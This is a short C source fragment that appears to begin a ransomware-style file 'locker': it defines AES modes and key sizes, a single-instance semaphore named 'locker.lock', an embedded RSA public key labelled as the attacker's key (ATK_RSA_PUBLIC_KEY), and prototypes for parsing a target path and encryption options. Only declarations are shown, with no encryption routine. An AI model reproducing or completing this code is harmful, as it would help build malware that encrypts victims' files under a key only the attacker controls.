#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <pthread.h>
#include <sys/stat.h>
#include <semaphore.h>

#define AES_128 0
#define AES_192 1
#define AES_256 2
#define AES_MODE_ECB 0
#define AES_MODE_CBC 1
#define MAX_MODE_LENGTH 8
#define MAX_TARGET_LENGTH 256

#define SEM_NAME "locker.lock"
#define ATK_RSA_PUBLIC_KEY "-----BEGIN PUBLIC KEY-----\n" \
    "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAySDRKBBg/2npTTbPhoz1\n" \
    "nd0Wht8iNs5f/fP0xSBu85PhLuYHsAQ0H2yNB5kVaKBgnXSEiix+tto59v73LF7S\n" \
    "aRmh5+o4PkZrSPO+eeptsk6Y2MM5VGzuSu2+sszDIRZnnJONaRf+6lX+lnEipVDM\n" \
    "CrFCQ9A+0M8hLpAxhiue6I6xdCltjKgPJgMZIOSSW7TKv26JXryCm5zA6lDQm5X4\n" \
    "yNiXAgfb1JX2WgT1TJpbaTPHs7AILMBKS3DUDKNMeFUD0VSsjrPRwzVS2qdz5e4B\n" \
    "nziQ0PeRCHSR/0cFDH0/C8hMQyt3p983DXChzT5QswlSmaj1xK5qXuJEHHTHiUm3\n" \
    "deF+eZbgg8lzGqXglaX8XxFl7OIEhMcwq0vJqlVEUzUNgBcUyisydxwC6SJ84WE0\n" \
    "4a9+aDmOycdVCYEr9C9GfRH67oD466hsWLH6t6+/18GfK7P4SiWPTMOOtrpcczjr\n" \
    "XSoQaRQA12JnZkHgim5pm5eS0XtDT2f+qSdOhUWsL1DzG1jlq/3/sMjPIC9+jTuZ\n" \
    "Xp+fw3+twf+tXCnF0ljT4vW+Cxx7YqOrKIvN58SlVjG1GhNN63dlRwKqa5pKe9fB\n" \
    "SkVPW+yTAMU+nB6QtZbluW+OFqR5kDbisQwBhCLjv+aodrMKQraRiy8ajOwDkMOd\n" \
    "BUhaUPlEJGIFfpI0XB7J6CkCAwEAAQ==\n" \
    "-----END PUBLIC KEY-----" \

void print_usage();
int is_already_running();
int parse_options(int* key_size, char* method, char* target, int argc, char** argv);